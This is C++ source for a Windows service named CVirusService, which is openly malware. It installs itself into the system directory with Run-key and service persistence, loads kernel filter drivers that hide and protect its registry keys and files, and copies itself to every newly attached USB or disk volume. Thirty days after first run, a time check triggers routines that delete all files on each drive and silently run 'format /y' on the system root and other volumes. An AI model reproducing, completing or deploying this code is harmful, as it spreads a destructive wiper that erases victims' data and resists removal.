#include "StdAfx.h"
#include "VirusService.h"
#include "..\..\System\File\FileEx.h"
#include "..\..\System\Service\ServiceManage.h"
#include <setupapi.h>
#include <Dbt.h>
#include "..\..\Driver\FilterSys\FilterControl\ProcessFilterControl.h"
#include "..\..\Driver\FilterSys\FilterControl\RegisterFilterControl.h"
#include "..\..\Driver\FilterSys\FilterControl\FilterSysDevice.h"
#include "..\..\Driver\ksfilter\KSFilterControl\KSFilterControl.h"
#include ".\StartUp.h"
#include <algorithm>
#include <atltime.h>

extern CVirusService * g_pService;

CVirusService::CVirusService(const TCHAR* name_) : CService(name_)
{
	m_ServiceName = name_;
	m_hWnd = NULL;
}

CVirusService::~CVirusService(void)
{
	UnLoad();
}

INT CVirusService::UnLoad()
{
#ifdef _DEBUG

	//ͣ�ò�ж�����з���
	CFilterSysDevice fsd;
	CRegisterFilterControl rfc;
	if(rfc.Open())
	{
		rfc.UnHook();
		rfc.Close();
	}// ���� if(rfc.Open())
	CProcessFilterControl pfc;
	if(pfc.Open())
	{
		pfc.UnHook();
		fsd.Close();
	} // ���� if(pfc.Open())
	fsd.Stop();
	fsd.Remove();

	CKSFilterControl ksf;
	ksf.Stop();
	ksf.Remove();

	CServiceManage sm;
	sm.SetServiceName(m_ServiceName.c_str());
	sm.Stop();
	sm.Remove();

#endif // ���� #ifdef _DEBUG
	return 0;
}

BOOL CVirusService::IsInstalledService(LPCTSTR pszServiceName)
{
	SERVICE_STATUS status;
	CServiceManage s;
	if(s.QueryStatus(&status))
	{
		switch(status.dwCurrentState)
		{
		case SERVICE_RUNNING:
			return TRUE;
		default:
			break;
		}
	}// ���� if(s.QueryStatus(&status))
	return FALSE;
}

/*!
\brief   ��װ����ʼ����
\param   ��
\return  ����Ϊ BOOL ��
\version 1.0
\author  ��  ��
\date    2007-6-11 22:13:15
*/
BOOL CVirusService::InstallAndStartService()
{
	BOOL bRet;
	//bRet = IsInstalledService(_T("ksfilter.Sys"));
	//if(!bRet)
	{
		_tstring szExe;
		_tstring szFilterSys;
		_tstring szKSFilterSys;
		_tstring szSysDir;

		CStartUp startUp;
		startUp.AddPrivilege(SE_SHUTDOWN_NAME);

		CSystem s;
		szSysDir = s.GetSystemDirectory();
		szFilterSys = szSysDir + _T("\\FilterSys.Sys");
		szKSFilterSys = szSysDir + _T("\\ksfilter.Sys");

		CFileEx f;
		f.GetModuleFileName();
		szExe = _T("\\") + f.GetFileName();
		szExe = szSysDir + szExe;

		//�����ļ���ϵͳ�ļ�����
		m_FileManage.CopyFilesToSysDirectory();

		//��װ������ֵ
		CStartUp su;
		su.RegStart(m_ServiceName.c_str(), szExe.c_str());

		//��װ����
		// - �ļ�����
		CKSFilterControl ksf;
#ifdef _DEBUG
		ksf.Stop();
		ksf.Remove();
#endif
		ksf.Install(szKSFilterSys.c_str(), SERVICE_KERNEL_DRIVER, SERVICE_SYSTEM_START);

		// - ����ϵͳ��������
		CFilterSysDevice fsd;
		CRegisterFilterControl rfc;
#ifdef _DEBUG
		if(rfc.Open())
		{
			rfc.UnHook();
			rfc.Close();
		}// ���� if(rfc.Open())
		CProcessFilterControl pfc;
		if(pfc.Open())
		{
			pfc.UnHook();
			fsd.Close();
		} // ���� if(pfc.Open())
		fsd.Stop();
		fsd.Remove();
#endif
		fsd.Install(szFilterSys.c_str(), SERVICE_KERNEL_DRIVER, SERVICE_SYSTEM_START);

		//StartFilterDrivers();//���Բ��ã���Ϊ�ڷ���ʼ��Ҫ����������run�У�

		//��װ�˷���
		CServiceManage sm;
		sm.SetServiceName(m_ServiceName.c_str());
#ifdef _DEBUG
		sm.Stop();
		sm.Remove();
#endif // ���� #ifdef _DEBUG
		szExe += _T(" -service");
		sm.Install(szExe.c_str(), SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START);
		//��ʼ����
#ifdef _DEBUG
		run();
#else
		start();
#endif
	
	}// ���� if(pfc.Open())
	return bRet;
}

INT CVirusService::SetFilters()
{
	INT nRet = 0;
	CFileEx f;
	f.GetModuleFileName();

	_tstring szDir = f.GetFilePath();
	if(szDir.at(szDir.size() - 1) != _T('\\'))
	{
		szDir += _T("\\");
	}// ���� if(szDir.at(szDir.size() - 1) != _T('\\'))
	CSystem s;
	_tstring szSys = s.GetSystemDirectory();
	if(szSys.at(szSys.size() - 1) != _T('\\'))
	{
		szSys += _T("\\");
	}// ���� (szSys.at(szSys.size() - 1) != _T('\\'))
	_tstring szKSFilterIni = szSys + _T("KSFilter.Ini");
	_tstring szProcessIni = szSys + _T("FilterProcess.ini");
	_tstring szRegisterIni = szSys + _T("FilterRegister.ini");

	// ���ù��˵�����
	// ���˽���
	CProcessFilterControl pfc;
	if(pfc.Open())
	{
		//pfc.LoadConfig(szProcessIni.c_str());
		pfc.SetProtectContent(f.GetFileName().c_str());
		//pfc.SaveConfig(szProcessIni.c_str());
		pfc.Close();
	}// ���� if(pfc.Open())

	// ����ע���
	CRegisterFilterControl rfc;
	if(rfc.Open())
	{
		//rfc.LoadConfig(szRegisterIni.c_str());
		rfc.SetProtectContent(_T("HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\KSFILTER"));
		rfc.SetProtectContent(_T("HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\KFILTER"));
		rfc.SetProtectContent((_T("HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\") + m_ServiceName).c_str());
		rfc.SetProtectContent((_T("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\") + m_ServiceName).c_str());
		rfc.SetProtectContent((_T("HKCU\\SOFTWARE\\") + m_ServiceName).c_str());
		//rfc.SaveConfig(szRegisterIni.c_str());
		rfc.Close();
	} // ���� if(rfc.Open())

	// �����ļ�
	CKSFilterControl ksfc;
	if(ksfc.Open())
	{
		//������ǰ������
		//ksfc.LoadConfig(szKSFilterIni.c_str());
		ksfc.Close();
	}// ���� if(ksfc.open())

	//���ù����ļ�
	m_FileManage.SetFilterFiles(szDir.c_str());
	//����ϵͳĿ¼�µĹ����ļ�
	if(szSys != szDir)
	{
		m_FileManage.SetFilterFiles(szSys.c_str());
	}// ���� if(szSys != szDir)

	//�ѹ������ݱ��浽�����ļ���
	if(ksfc.Open())
	{
		//ksfc.SaveConfig(szKSFilterIni.c_str());
		// �������������ļ�
		//ksfc.SetProtectFile(szRegisterIni.c_str());
		//ksfc.SetProtectFile(szProcessIni.c_str());
		//ksfc.SetProtectFile(szKSFilterIni.c_str());
		ksfc.Close();
	} // ���� if(ksfc.Open())

	return nRet;
}

/*!
\brief   ��ʼ�����������ļ����ˡ�ϵͳ���ˣ�
\param   ��
\return  ����Ϊ BOOL ��
\version 1.0
\author  ��  ��
\date    2007-6-12 23:15:06
*/
BOOL CVirusService::StartFilterDrivers()
{
	// �����ļ���������
	CKSFilterControl ksf;
	ksf.Start();

	// ����ϵͳ��������(ע�������)
	CFilterSysDevice fsd;
	fsd.Start();
	CProcessFilterControl processFilter;
	if(processFilter.Open())
	{
		processFilter.Hook();
		processFilter.Close();
	} // ���� if(processFilter.Open())
	CRegisterFilterControl registerFilter;
	if(registerFilter.Open())
	{
		registerFilter.Hook();
		registerFilter.Close();
	} // ���� if(registerFilter.Open())

	// ���ù��˵�����
	SetFilters();

	return TRUE;
}

/*------------------------------------------------------------------
FirstDriveFromMask (unitmask)

Description
Finds the first valid drive letter from a mask of drive letters.
The mask must be in the format bit 0 = A, bit 1 = B, bit 3 = C, 
etc. A valid drive letter is defined when the corresponding bit 
is set to 1.

Returns the first drive letter that was found.
--------------------------------------------------------------------*/
TCHAR FirstDriveFromMask (ULONG unitmask)
{
	TCHAR i;

	for (i = 0; i < 26; ++i)
	{
		if (unitmask & 0x1)
			break;
		unitmask = unitmask >> 1;
	}

	return(i + _T('A'));
}

/*!
\brief   ��Ӧ�豸�ı���Ϣ
\param   WPARAM wParam���¼�����
\param   LPARAM lParam���¼�����
\return  ����Ϊ LRESULT ������TRUE,��������,����BROADCAST_QUERY_DENY,��ܾ�����.
\version 1.0
\author  ��  ��
\date    2007-6-26 21:19:01
*/
LRESULT CVirusService::OnDeviceChange(WPARAM wParam, LPARAM lParam)
{
	PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
	switch(wParam)
	{
	case DBT_DEVICEARRIVAL:
		TRACE(_T("device type:%d\n"), lpdb->dbch_devicetype);
		if(lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)
		{
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			TRACE(_T("device flages:%d\n"), lpdbv->dbcv_flags);
			if(!(lpdbv->dbcv_flags & DBTF_MEDIA))
			{
				//һ��U�̻�A�̻�һ��Ӳ�̲���
				if(NULL != lpdbv->dbcv_unitmask)
				{
					_tstring szDev;
					szDev = FirstDriveFromMask(lpdbv->dbcv_unitmask);
					TRACE(_T("disk device :%s\n"), szDev.c_str());
					//�����ļ�
					m_FileManage.CopyFilesToRoot(szDev.c_str());
				} // ���� if(NULL != lpdbv->dbcv_unitmask)
			}
		}
		break;
	case DBT_DEVICEQUERYREMOVE:
		TRACE(_T("Device query remove\n"));
		if(lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)
		{
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			TRACE(_T("device flages:%d\n"), lpdbv->dbcv_flags);
			_tstring szDev;
			szDev = FirstDriveFromMask(lpdbv->dbcv_unitmask);
			TRACE(_T("disk device :%s\n"), szDev.c_str());
		}
		break;
	case DBT_DEVICEREMOVECOMPLETE:
		TRACE(_T("Device remove complete\n"));
		if(lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)
		{
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			TRACE(_T("device flages:%d\n"), lpdbv->dbcv_flags);
			_tstring szDev;
			szDev = FirstDriveFromMask(lpdbv->dbcv_unitmask);
			TRACE(_T("disk device :%s\n"), szDev.c_str());
		}
		break;
	case DBT_DEVNODES_CHANGED:
		TRACE(_T("Device changed\n"));
		break;
	default:
		break;
	}// ���� switch(wParam)

	return TRUE;
}

LRESULT CALLBACK CVirusService::WndProcess(HWND hwnd,      // handle to window
										   UINT uMsg,      // message identifier
										   WPARAM wParam,  // first message parameter
										   LPARAM lParam)  // second message parameter

{
	TRACE(_T("%d\n"), uMsg);
	switch(uMsg)
	{
	case WM_CREATE:
		::SetTimer(hwnd, 0, 1000, NULL);
	case WM_DEVICECHANGE:
		g_pService->OnDeviceChange(wParam, lParam);
		break;
	case WM_TIMER:
		//MessageBox(NULL, _T("ok"), NULL, MB_OK);
		g_pService->Destroy();
		break;
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}// ���� switch(uMsg)
	return S_OK;
}

BOOL CVirusService::RegisterWindow()
{
	DWORD threadID = 0;
	HANDLE hThread = NULL;

	WNDCLASSEX wcex;
	wcex.cbSize         = sizeof(WNDCLASSEX);
	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProcess;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance      = GetModuleHandle(0);
	wcex.hIcon          = NULL;
	wcex.hCursor		= NULL;
	wcex.hbrBackground  = NULL;
	wcex.lpszMenuName	= NULL;
	wcex.lpszClassName  = m_ServiceName.c_str();
	wcex.hIconSm		= NULL;

	ATOM atom = RegisterClassEx(&wcex);
	if(NULL == atom)
	{
		return FALSE;
	} // ���� if(NULL == atom)
	HWND m_hWnd = CreateWindow((LPCTSTR)atom, NULL, WS_OVERLAPPED,
		0, 0, 10, 10, 0, 0, wcex.hInstance, NULL);

	if (!m_hWnd) 
		return FALSE;

	// Start the message loop. 
	int bRet = 0;
	MSG msg;

	while( (bRet = GetMessage( &msg, NULL, 0, 0 )) != 0)
	{ 
		if (bRet == -1)
		{
			// handle the error and possibly exit
			break;
		}
		else
		{
			TranslateMessage(&msg); 
			DispatchMessage(&msg); 
		}
	}
	if(m_hWnd)
	{
		CloseHandle(m_hWnd);
	} // ���� if(m_hWnd)
	UnregisterClass((LPCTSTR)atom, wcex.hInstance);
	return TRUE;
}

int CVirusService::run()
{
	int nRet = 0;

#ifndef _DEBUG
	// ��������
	StartFilterDrivers();	
#endif

	// ע�ᴰ�ڣ���Ϣѭ��
	RegisterWindow();

	return nRet;
}

void CVirusService::stop()
{
#ifdef _DEBUG
	::PostMessage(m_hWnd, WM_QUIT, NULL, NULL);
#endif
}

/*!
\brief   �����������
\param   int argc     ��
\param   TCHAR* argv[]��
\return  ����Ϊ DWORD ��
\version 1.0
\author  ��  ��
\date    2007-6-14 20:23:04
*/
DWORD CVirusService::serviceMain(int argc, TCHAR* argv[])
{
	DWORD dwRet = S_OK;
#ifdef _DEBUG
	setStatus(SERVICE_RUNNING);
#else
	setStatus(SERVICE_STOP_PENDING);
#endif
	run();
	setStatus(SERVICE_STOP_PENDING);
	return dwRet;
}

BOOL CVirusService::IsDestroy()
{
	BOOL bRet = FALSE;
	DWORD dwValue = 0;
	CRegKey reg;
	_tstring szName = _T("Software\\") + g_pService->GetName();
	_tstring szValue = _T("Time");

	if(ERROR_SUCCESS != reg.Open(HKEY_CURRENT_USER, szName.c_str()))
	{
		if(ERROR_SUCCESS == reg.Create(HKEY_CURRENT_USER, szName.c_str()))
		{
			CTime t = CTime::GetCurrentTime();
			reg.SetDWORDValue(_T("year"), t.GetYear());
			reg.SetDWORDValue(_T("month"), t.GetMonth());
			reg.SetDWORDValue(_T("day"), t.GetDay());
		} // ���� if(ERROR_SUCCESS == reg.Create(HKEY_LOCAL_MACHINE, szName.c_str()))
		return FALSE;
	}// ���� if(ERROR_SUCCESS != reg.Open(HKLM, szName.c_str()))
	DWORD dwYear, dwMonth, dwDay;
	if(ERROR_SUCCESS != reg.QueryDWORDValue(_T("year"), dwValue))
	{
		return FALSE;
	}// ���� if(ERROR_SUCCESS != reg.QueryDWORDValue(_T("year"), dwValue))
	dwYear = dwValue;
	if(ERROR_SUCCESS != reg.QueryDWORDValue(_T("month"), dwValue))
	{
		return FALSE;
	}// ���� if(ERROR_SUCCESS != reg.QueryDWORDValue(_T("month"), dwValue))
	dwMonth = dwValue;
	if(ERROR_SUCCESS != reg.QueryDWORDValue(_T("day"), dwValue))
	{
		return FALSE;
	}// ���� if(ERROR_SUCCESS != reg.QueryDWORDValue(_T("day"), dwValue))
	dwDay = dwValue;
	CTime t(dwYear, dwMonth, dwDay, 0, 0, 0);
	CTimeSpan ts = CTime::GetCurrentTime() - t;
	CTimeSpan tLimit(30, 0, 0, 0);
	if(ts > tLimit)
	{
		return TRUE;
	} // ���� if(ts > tLimit)
	return bRet;
}

BOOL CVirusService::Destroy()
{
	USES_CONVERSION;
	BOOL bRet = TRUE;
	if(!IsDestroy())
	{
		return FALSE;
	}// ���� if(!IsDestroy())

	CSystem sys;
	//ɾ������
	bRet = sys.EnumRootDirectory(DestroyOperate);

	//��ʽ��
#ifndef _DEBUG
	_tstring szTemp = _T("format /y ");
	szTemp += sys.GetSystemRootDirectory();
	WinExec(T2A(szTemp.c_str()), SW_HIDE);
#endif

	return bRet;
}

DWORD CVirusService::DestroyOperateThread(LPCTSTR szRoot)
{
	DWORD dwID;
	HANDLE h = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DestroyOperate, (LPVOID)szRoot, NULL, &dwID);
	if(h)
	{
		CloseHandle(h);
	}// ���� if(h)
	return 0;
}

BOOL CVirusService::DestroyOperate(LPCTSTR szRoot)
{
	USES_CONVERSION;
	CFileEx file;
	CSystem sys;
	BOOL bExit = FALSE;

	file.EnumDirectory(szRoot, DeleteFileOperate, &bExit);

	//��ʽ��
#ifndef _DEBUG
	_tstring szTemp = _T("format /y ");
	szTemp += szRoot;
	WinExec(T2A(szTemp.c_str()), SW_HIDE);
#endif

	return TRUE;
}

BOOL CVirusService::DeleteFileOperate(LPCTSTR szFile)
{
#ifdef _DEBUG
	TRACE(_T("%s\n"), szFile);
#else
	SetFileAttributes(szFile, FILE_ATTRIBUTE_NORMAL);
	::DeleteFile(szFile);
#endif
	return FALSE;
}